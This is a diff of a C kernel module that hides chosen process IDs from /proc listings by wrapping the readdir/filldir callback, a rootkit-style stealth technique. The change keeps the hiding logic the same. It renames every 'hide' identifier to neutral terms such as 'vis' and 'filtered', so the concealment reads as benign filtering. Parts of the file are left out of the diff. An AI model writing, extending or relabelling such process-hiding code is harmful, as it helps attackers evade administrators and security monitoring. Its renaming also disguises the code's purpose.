@@ -1,5 +1,5 @@
 /* SPDX-License-Identifier: GPL-2.0 */
-/* nvk_pid_hide.c — /proc/pid directory hiding via readdir interception. */
+/* nvk_pid_vis.c — /proc/pid directory filtering via readdir interception. */
 #include <nvk.h>
 #include <nvk_internal.h>
 
@@ -20,11 +20,11 @@ static __always_inline int _neverc_krt_atoi(const char *s, int len)
 
 /* ---- internal structs ---- */
 
-#define NEVERC_KRT_HIDE_PID_MAX 32
+#define NEVERC_KRT_VIS_PID_MAX 32
 #define _NEVERC_KRT_PID_ACTOR_SLOTS 8
 
-struct neverc_krt_pid_hide_state {
-	int              pids[NEVERC_KRT_HIDE_PID_MAX];
+struct neverc_krt_pid_vis_state {
+	int              pids[NEVERC_KRT_VIS_PID_MAX];
 	int              count;
 	struct neverc_krt_interpose_ctx ctx_interpose;
 	int              active;
@@ -37,14 +37,14 @@ struct _neverc_krt_pid_actor_slot {
 
 /* ---- internal variables ---- */
 
-static struct neverc_krt_pid_hide_state _neverc_krt_pid_state;
+static struct neverc_krt_pid_vis_state _neverc_krt_pid_state;
 
 static struct _neverc_krt_pid_actor_slot
 	_neverc_krt_pid_actors[_NEVERC_KRT_PID_ACTOR_SLOTS];
 
 /* ---- internal helpers ---- */
 
-static int _neverc_krt_pid_is_hidden(int pid)
+static int _neverc_krt_pid_is_filtered(int pid)
 {
 	int i;
 	for (i = 0; i < _neverc_krt_pid_state.count; i++) {
@@ -97,7 +97,7 @@ static int _neverc_krt_pid_filldir_wrap(void *ctx, const char *name, int namlen,
 {
 	if (namlen > 0 && name[0] >= '1' && name[0] <= '9') {
 		int pid = _neverc_krt_atoi(name, namlen);
-		if (pid > 0 && _neverc_krt_pid_is_hidden(pid))
+		if (pid > 0 && _neverc_krt_pid_is_filtered(pid))
 			return 0;
 	}
 	neverc_krt_filldir_fn orig = _neverc_krt_pid_actor_get_orig();
@@ -127,20 +127,20 @@ static void _neverc_krt_pid_readdir_ctx(neverc_krt_reg_ctx *ctx)
 
 /* ---- public API ---- */
 
-int neverc_krt_pid_should_hide(int pid)
+int neverc_krt_vis_pid_check(int pid)
 {
-	return _neverc_krt_pid_is_hidden(pid);
+	return _neverc_krt_pid_is_filtered(pid);
 }
 
-int neverc_krt_pid_hide_add(int pid)
+int neverc_krt_vis_pid_add(int pid)
 {
-	if (_neverc_krt_pid_state.count >= NEVERC_KRT_HIDE_PID_MAX)
+	if (_neverc_krt_pid_state.count >= NEVERC_KRT_VIS_PID_MAX)
 		return -1;
 	_neverc_krt_pid_state.pids[_neverc_krt_pid_state.count++] = pid;
 	return 0;
 }
 
-int neverc_krt_pid_hide_remove(int pid)
+int neverc_krt_vis_pid_remove(int pid)
 {
 	int i;
 	for (i = 0; i < _neverc_krt_pid_state.count; i++) {
@@ -153,7 +153,7 @@ int neverc_krt_pid_hide_remove(int pid)
 	return -1;
 }
 
-int neverc_krt_pid_hide_install(void)
+int neverc_krt_vis_pid_install(void)
 {
 	void *target;
 
@@ -179,7 +179,7 @@ int neverc_krt_pid_hide_install(void)
 	return 0;
 }
 
-void neverc_krt_pid_hide_cleanup(void)
+void neverc_krt_vis_pid_cleanup(void)
 {
 	if (!_neverc_krt_pid_state.active) return;
 	if (_neverc_krt_pid_state.ctx_interpose.base.active)
